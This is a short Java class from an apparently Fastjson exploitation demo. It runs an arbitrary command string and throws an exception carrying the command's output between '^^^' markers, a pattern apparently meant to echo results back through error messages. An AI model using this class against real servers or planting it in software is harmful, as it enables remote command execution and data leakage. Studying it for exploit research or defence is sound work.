package FastJsonDemo;

import java.io.*;

public class R {
    public void exec(String cmd)throws Exception{
        String s = "";
        int len;
        int buffSize = 4096;
        byte[]buffer = new byte[buffSize];
        BufferedInputStream bis = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream(),buffSize);

        while((len = bis.read(buffer,0,buffSize)) != -1)
            s += new String(buffer,0,len);

        bis.close();
        throw new Exception("^^^" + s + "^^^");
    }
}
